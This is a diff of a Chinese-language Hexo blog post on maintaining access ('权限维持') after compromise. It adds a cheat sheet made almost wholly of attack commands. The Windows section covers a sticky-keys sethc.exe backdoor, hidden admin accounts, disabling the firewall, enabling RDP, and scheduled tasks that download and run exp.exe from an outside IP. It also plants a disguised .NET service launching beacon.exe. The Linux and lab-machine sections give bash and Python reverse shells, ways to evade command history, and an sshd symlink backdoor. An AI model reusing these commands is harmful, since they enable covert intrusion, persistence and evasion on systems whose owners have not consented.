@@ -18,15 +18,15 @@
   
   
   <title>权限维持 | Hexo</title>
-  <meta name="description" content="Windows">
+  <meta name="description" content="Windows12隐藏马Attrib +s +a +h +r 1.txt    12move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bakCopy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe    123456net user qianxin Q">
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限维持">
 <meta property="og:url" content="http://example.com/2024/01/21/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Windows">
+<meta property="og:description" content="Windows12隐藏马Attrib +s +a +h +r 1.txt    12move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bakCopy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe    123456net user qianxin Q">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-01-21T01:31:07.000Z">
-<meta property="article:modified_time" content="2024-01-21T07:45:38.419Z">
+<meta property="article:modified_time" content="2024-01-24T07:48:37.252Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   <!-- Canonical links -->
@@ -356,7 +356,91 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2>
+        <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐藏马</span><br><span class="line">Attrib +s +a +h +r 1.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak</span><br><span class="line">Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user qianxin QanXin.Nb123 /add</span><br><span class="line">net localgroup administrators qianxin /add</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">netstat -anop tcp | find &quot;3389&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;    </span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125; </span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125; </span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125; </span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125; </span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;  </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">md a...\</span><br><span class="line"></span><br><span class="line">rd /s /q a...\</span><br><span class="line"></span><br><span class="line">Windows 下不能够以下⾯这些字样来命名⽂件/⽂件夹，包括：aux，com1，com2，prn，con和nul等，但 是通过cmd下是可以创建此类⽂件夹的，使⽤copy命令即可实现 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">copy 1.php \\.\C:\software\phpstudy_pro\WWW\aux.php</span><br><span class="line">del \\.\C:\software\phpstudy_pro\WWW\aux.php</span><br><span class="line">type</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.60 lport=4444 -f exe -o 1.exe</span><br><span class="line"></span><br><span class="line">https://i.hacking8.com/tiquan</span><br><span class="line"></span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">taskkill /F /T /IM wininit.exe</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">计划任务</span><br><span class="line">schtasks /create /tn &quot;\Microsoft\WindowsUpdate\Tasks\Secute\Update\Run&quot; /tr &quot;123&quot; /rl highest /F /sc minute /mo 1  /RU system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一般用户权限</span><br><span class="line">schtasks /create /tn &quot;task1&quot; /tr &quot;curl http://106.54.222.22:8080/exp.exe -o C:\\Windows\\Temp\\exp.exe &amp;C:\\Windows\\Temp\\exp.exe&quot; /F /sc minute /mo 1</span><br><span class="line">schtasks /create /tn &quot;task2&quot; /tr &quot;C:\\Windows\\Temp\\exp.exe&quot;  /F /sc minute /mo 1</span><br><span class="line">win7</span><br><span class="line">certutil -urlcache -split -f http://106.54.222.22:8080/1.cmd 1.cmd&amp;1.cmd</span><br><span class="line"></span><br><span class="line">服务</span><br><span class="line">sc create &quot;.NET CLR Networking 3.5.0.0&quot; binpath= &quot;cmd.exe /k C:\Users\administrator\beacon.exe&quot; depend= Tcpip obj= Localsystem start= auto</span><br><span class="line"></span><br><span class="line">sc delete &quot;.NET CLR Networking 3.5.0.0&quot;</span><br><span class="line"></span><br><span class="line">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0</span><br><span class="line"></span><br><span class="line">sc sdset &quot;.NET CLR Networking 3.5.0.0&quot; &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建用户</span><br><span class="line">net user qianxin$ 1qa@WS /add &amp; net localgroup administrators qianxin$ /add </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /bin/bash -c &#x27;/bin/sh -i &gt;&amp;/dev/tcp/134.209.105.72/4444 0&gt;&amp;1&#x27;;\r%100c\n</span><br><span class="line"></span><br><span class="line">加锁</span><br><span class="line">chattr +i 1.txt</span><br><span class="line">解锁</span><br><span class="line">chattr -i 1.txt    </span><br><span class="line"></span><br><span class="line">命令不被.zsh_history记录</span><br><span class="line">  set +o history</span><br><span class="line">恢复</span><br><span class="line">  set -o history</span><br><span class="line">  </span><br><span class="line">sudo systemctl stop firewalld</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oPort=1234 </span><br><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br><span class="line">ssh root@192.168.1.148 -p12345</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="靶机-medium-socnet"><a href="#靶机-medium-socnet" class="headerlink" title="靶机_medium_socnet"></a>靶机_medium_socnet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;     </span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.56.102 -rport 9996</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -itd --name ubuntu16.04 homebrew/ubuntu16.04 /bin/bash</span><br><span class="line"></span><br><span class="line">docker exec -it ubuntu16.04 /bin/bash</span><br><span class="line"></span><br><span class="line">docker cp 37292.c ubuntu16.04:/root/</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
       
     </div>
     <div class="article-footer">
